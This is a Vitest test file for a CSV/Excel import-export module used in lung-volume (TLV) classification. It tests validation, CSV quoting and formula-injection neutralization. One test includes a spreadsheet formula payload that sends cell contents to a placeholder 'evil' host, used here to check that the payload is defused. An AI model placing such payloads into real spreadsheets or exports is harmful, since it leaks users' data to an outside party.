import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import {
  processRows,
  processRowsWithSummary,
  prepareImport,
  buildExportRows,
  parseCsv,
  toCsv,
} from '../useDataPersistence.js';
import { heightAdjustedTLV, classify, formatHtTLV } from '@/domain/classification.js';

// Mirror the row-object assembly that loadDataFromCsv performs after parseCsv,
// so tests can exercise the import path down to processRows without the DOM.
// Cells are kept as strings (null for blank); processRows() does the coercion.
function csvToRowObjects(text) {
  const matrix = parseCsv(text);
  const headers = matrix[0].map((h) => h.trim());
  return matrix.slice(1).map((cells) => {
    const row = {};
    headers.forEach((header, i) => {
      const v = cells[i] === undefined ? '' : cells[i].trim();
      row[header] = v === '' ? null : v;
    });
    return row;
  });
}

describe('processRows — calculable (measured) height', () => {
  it('matches the manual domain classify path and is flagged calculable', () => {
    const [r] = processRows([{ id: 'p1', age: 40, tlv: 3400, height: 1.7 }]);
    const expectedHtlv = heightAdjustedTLV(3400, 1.7); // 2000
    expect(r.htlv).toBeCloseTo(expectedHtlv, 6);
    expect(r.uncalculable).toBe(false);
    expect(r.class).toBe(classify(expectedHtlv, 40));
  });

  it('parses comma-decimal heights', () => {
    const [r] = processRows([{ id: 'p1', age: 40, tlv: 3400, height: '1,7' }]);
    expect(r.uncalculable).toBe(false);
    expect(r.htlv).toBeCloseTo(2000, 6);
  });
});

describe('processRows — height is no longer estimated (issue #37)', () => {
  it('keeps a height-less row but flags it uncalculable (no cohort-mean estimate)', () => {
    const out = processRows([
      { id: 'a', age: 50, tlv: 3200, height: 1.6 },
      { id: 'b', age: 50, tlv: 3600, height: 1.8 },
      { id: 'c', age: 50, tlv: 3400 }, // no height
    ]);
    const c = out.find((r) => r.id === 'c');
    expect(c.uncalculable).toBe(true);
    expect(c.htlv).toBeNull();
    expect(c.class).toBeNull();
    expect(c.lgr).toBe('N/A');
    // The estimate fields are gone entirely.
    expect(c).not.toHaveProperty('htlvEstimated');
    expect(c).not.toHaveProperty('estimatedHtTLV');
    expect(c).not.toHaveProperty('estimatedClass');
  });

  it('treats an out-of-range height like a missing one (HEIGHT_MIN/MAX enforced on import)', () => {
    const tooShort = processRows([{ id: 's', age: 40, tlv: 3400, height: 0.1 }])[0];
    const tooTall = processRows([{ id: 't', age: 40, tlv: 3400, height: 5 }])[0];
    expect(tooShort.uncalculable).toBe(true);
    expect(tooTall.uncalculable).toBe(true);
    expect(tooShort.htlv).toBeNull();
    // The offending height is still shown so the user can fix it.
    expect(tooShort.height).toBe(0.1);
    expect(tooTall.height).toBe(5);
  });
});

describe('processRows — uncalculable rows carry no class', () => {
  it('leaves class null and flags the row', () => {
    const [r] = processRows([{ id: 'x', age: 30, tlv: 5000 }]);
    expect(r.class).toBeNull();
    expect(r.uncalculable).toBe(true);
  });
});

describe('processRows — validation', () => {
  it('drops only rows without a usable id; keeps others as uncalculable', () => {
    const out = processRows([
      { id: 'ok', age: 40, tlv: 3400, height: 1.7 },
      { age: 40, tlv: 3400 }, // missing id -> DROPPED
      { id: 'noage', tlv: 3400, height: 1.7 }, // missing age -> kept, uncalculable
      { id: 'notlv', age: 40, height: 1.7 }, // missing tlv -> kept, uncalculable
      { id: 'badage', age: 5, tlv: 3400, height: 1.7 }, // age below AGE_MIN -> kept, uncalculable
      { id: 'bigtlv', age: 40, tlv: 999999, height: 1.7 }, // tlv above TLV_MAX -> kept, uncalculable
      { id: 'nan', age: 'abc', tlv: 3400, height: 1.7 }, // non-numeric age -> kept, uncalculable
      null, // junk -> DROPPED
    ]);
    expect(out.map((r) => r.id)).toEqual(['ok', 'noage', 'notlv', 'badage', 'bigtlv', 'nan']);
    expect(out.find((r) => r.id === 'ok').uncalculable).toBe(false);
    for (const id of ['noage', 'notlv', 'badage', 'bigtlv', 'nan']) {
      expect(out.find((r) => r.id === id).uncalculable).toBe(true);
    }
  });

  it('returns [] for non-array input', () => {
    expect(processRows(null)).toEqual([]);
    expect(processRows(undefined)).toEqual([]);
  });

  it('drops rows whose id is blank or whitespace-only', () => {
    const out = processRows([
      { id: 'ok', age: 40, tlv: 3400, height: 1.7 },
      { id: '', age: 40, tlv: 3400, height: 1.7 }, // empty id
      { id: '   ', age: 40, tlv: 3400, height: 1.7 }, // whitespace id
    ]);
    expect(out.map((r) => r.id)).toEqual(['ok']);
  });
});

describe('prepareImport — honest row accounting', () => {
  it('counts malformed rows separately from rows with a missing ID', () => {
    expect(processRowsWithSummary([null, 'junk', { id: ' ' }])).toEqual({
      rows: [],
      malformedCount: 2,
      missingIdCount: 1,
    });
  });

  it('separates malformed rows from rows with a missing ID', () => {
    const outcome = prepareImport([
      { id: 'ok', age: 40, height: 1.7, tlv: 3400 },
      null,
      'junk',
      { age: 40, height: 1.7, tlv: 3400 },
      { id: 'missing-height', age: 40, tlv: 3400 },
    ]);

    expect(outcome.rows.map((row) => row.id)).toEqual(['ok', 'missing-height']);
    expect(outcome.error).toBeNull();
    expect(outcome.notice).toBe(
      '1 row skipped (missing or blank ID). 2 malformed rows skipped. 1 row could not be calculated (missing or out-of-range height, age, or TLV) — shown as N/A and not plotted.'
    );
  });

  it('rejects an empty array without replacing existing application data', () => {
    expect(prepareImport([])).toEqual({
      rows: [],
      error: 'No rows found — nothing imported.',
      notice: null,
    });
  });

  it('reports exact reasons when every row is unusable', () => {
    expect(prepareImport([null, { id: ' ' }])).toEqual({
      rows: [],
      error:
        'No usable rows found — nothing imported. 1 row skipped (missing or blank ID). 1 malformed row skipped.',
      notice: null,
    });
  });
});

describe('processRows — export/import header aliasing (round-trip)', () => {
  it('re-imports the app’s own export headers and preserves ids (incl. leading zeros)', () => {
    const first = processRows([
      { id: '007', age: 40, tlv: 3400, height: 1.7 }, // calculable, leading-zero id
      { id: 'e1', age: 50, tlv: 3400 }, // height-less -> uncalculable
    ]);
    const reimported = processRows(buildExportRows(first)); // keys: ID, Age (y), Height (m)...
    expect(reimported.map((r) => r.id)).toEqual(['007', 'e1']);

    const m = reimported.find((r) => r.id === '007');
    expect(m.uncalculable).toBe(false);
    expect(m.class).toBe(first[0].class); // measured class stable across round-trip

    const e = reimported.find((r) => r.id === 'e1');
    expect(e.uncalculable).toBe(true); // height-less row stays uncalculable across round-trip
    expect(e.class).toBeNull();
  });

  it('accepts a lowercase-id string verbatim without numeric coercion', () => {
    const [r] = processRows(csvToRowObjects('id,age,tlv,height\n"00123",40,3400,1.7'));
    expect(r.id).toBe('00123');
  });

  it('falls back to a header alias when the canonical key is blank/whitespace', () => {
    const [r] = processRows([
      { id: '   ', ID: '007', 'Age (y)': 40, 'TLV (ml)': 3400, 'Height (m)': 1.7 },
    ]);
    expect(r.id).toBe('007');
  });
});

describe('processRows — legacy pg is informational, class is recomputed', () => {
  it('maps an incoming legacy pg but does not trust it for classification', () => {
    const [r] = processRows([{ id: 'p', age: 40, tlv: 1100, height: 1.7, pg: 'PG5' }]);
    expect(r.importedClass).toBe('E'); // legacyPgToLetter('PG5')
    expect(r.class).toBe(classify(heightAdjustedTLV(1100, 1.7), 40)); // recomputed from data
    expect(r.class).not.toBe(r.importedClass); // file label not trusted
  });

  it('passes a letter class column through the legacy shim', () => {
    const [r] = processRows([{ id: 'p', age: 40, tlv: 3400, height: 1.7, class: 'C' }]);
    expect(r.importedClass).toBe('C');
  });
});

describe('buildExportRows', () => {
  it('drops the estimate columns and marks uncalculable rows as N/A', () => {
    const points = processRows([
      { id: 'm', age: 40, tlv: 3400, height: 1.7 },
      { id: 'e', age: 40, tlv: 3400 }, // height-less -> uncalculable
    ]);
    const ex = buildExportRows(points);

    // Each removed estimate column must be gone (asserted individually so a single
    // column regressing still fails the test).
    const keys = Object.keys(ex[0]);
    expect(keys).not.toContain('htTLV_estimated');
    expect(keys).not.toContain('estimatedHtTLV');
    expect(keys).not.toContain('estimatedClass');

    const m = ex.find((r) => r.ID === 'm');
    expect(m.Class).toBe(classify(heightAdjustedTLV(3400, 1.7), 40));
    expect(m.htTLV).toBe(formatHtTLV(heightAdjustedTLV(3400, 1.7)));

    const e = ex.find((r) => r.ID === 'e');
    expect(e.Class).toBe('N/A'); // explicit could-not-calculate marker
    expect(e.htTLV).toBe('');
    expect(e['LGR (%/y)']).toBe('N/A');
  });

  it('returns [] for non-array input', () => {
    expect(buildExportRows(null)).toEqual([]);
  });
});

describe('parseCsv — quote-aware parsing', () => {
  it('keeps a comma inside a quoted field as one cell', () => {
    expect(parseCsv('id,group\np1,"North, Ward"')).toEqual([
      ['id', 'group'],
      ['p1', 'North, Ward'],
    ]);
  });

  it('unescapes doubled quotes inside a quoted field', () => {
    expect(parseCsv('a\n"say ""hi"""')).toEqual([['a'], ['say "hi"']]);
  });

  it('tolerates CRLF line endings and a trailing newline', () => {
    expect(parseCsv('a,b\r\n1,2\r\n')).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ]);
  });

  it('preserves a newline inside a quoted field', () => {
    expect(parseCsv('a\n"line1\nline2"')).toEqual([['a'], ['line1\nline2']]);
  });

  it('import path preserves a comma-containing group label end to end', () => {
    const rows = csvToRowObjects('id,age,tlv,height,group\np1,40,3400,1.7,"North, Ward"');
    const [r] = processRows(rows);
    expect(r.id).toBe('p1');
    expect(r.group).toBe('North, Ward');
    expect(r.uncalculable).toBe(false);
  });

  it('flushes a final empty quoted field with or without a trailing newline', () => {
    // EOF shape must not change the row count.
    expect(parseCsv('id\n""')).toEqual([['id'], ['']]);
    expect(parseCsv('id\n""\n')).toEqual([['id'], ['']]);
  });

  it('throws on an unterminated quoted field instead of importing garbage', () => {
    expect(() => parseCsv('id\n"abc')).toThrow(/unterminated/i);
  });

  it('strips a leading UTF-8 BOM so the first header is clean', () => {
    expect(parseCsv('\uFEFFid,age\np1,40')).toEqual([
      ['id', 'age'],
      ['p1', '40'],
    ]);
  });
});

describe('toCsv — correct quoting (symmetric with parseCsv)', () => {
  it('quotes only fields containing a comma, quote, or newline', () => {
    const csv = toCsv([{ ID: 'x', Group: 'A, B' }], ['ID', 'Group']);
    expect(csv).toBe('ID,Group\nx,"A, B"');
  });

  it('doubles interior quotes', () => {
    const csv = toCsv([{ ID: 'x', Group: 'a"b' }], ['ID', 'Group']);
    expect(csv).toBe('ID,Group\nx,"a""b"');
  });

  it('round-trips a comma-containing value through toCsv -> parseCsv', () => {
    const value = 'North, Ward';
    const csv = toCsv([{ Group: value }], ['Group']);
    expect(parseCsv(csv)[1][0]).toBe(value);
  });
});

describe('toCsv — formula-injection neutralization (CWE-1236)', () => {
  it('prefixes a leading "=" with an apostrophe so spreadsheets treat it as text', () => {
    const csv = toCsv([{ ID: '=1+1', Group: 'A' }], ['ID', 'Group']);
    expect(csv).toBe("ID,Group\n'=1+1,A");
  });

  it('neutralizes the other trigger characters: +, -, @, tab, CR', () => {
    const csv = toCsv(
      [{ a: '+SUM(A1)', b: '-2+3', c: '@cmd', d: '\tx', e: '\rx' }],
      ['a', 'b', 'c', 'd', 'e']
    );
    expect(csv).toBe("a,b,c,d,e\n'+SUM(A1),'-2+3,'@cmd,'\tx,\"'\rx\"");
  });

  it('neutralizes a formula payload while keeping RFC-4180 quoting intact', () => {
    const payload = '=HYPERLINK("http://evil/?d="&A1,"click")';
    const csv = toCsv([{ Group: payload }], ['Group']);
    expect(csv).toBe(`Group\n"'=HYPERLINK(""http://evil/?d=""&A1,""click"")"`);
    // The apostrophe prefix survives a round-trip; the payload never reappears bare.
    expect(parseCsv(csv)[1][0]).toBe(`'${payload}`);
  });

  it('leaves plain negative numbers untouched (LGR column must stay numeric)', () => {
    const csv = toCsv([{ 'LGR (%/y)': '-1.23' }], ['LGR (%/y)']);
    expect(csv).toBe('LGR (%/y)\n-1.23');
  });

  it('leaves ordinary values and empty cells untouched', () => {
    const csv = toCsv([{ ID: 'P001', Group: '' }], ['ID', 'Group']);
    expect(csv).toBe('ID,Group\nP001,');
  });
});

describe('useDataPersistence — exceljs is code-split (issue #29)', () => {
  const source = readFileSync(
    resolve(process.cwd(), 'src/composables/useDataPersistence.js'),
    'utf8'
  );

  it('has no top-level static exceljs import (keeps it out of the entry chunk)', () => {
    expect(source).not.toMatch(/^\s*import\s+ExcelJS\s+from\s+['"]exceljs['"]/m);
  });

  it('dynamically imports exceljs at both Excel call sites', () => {
    const dynamicImports = source.match(/await import\(['"]exceljs['"]\)/g) ?? [];
    expect(dynamicImports.length).toBe(2);
  });
});
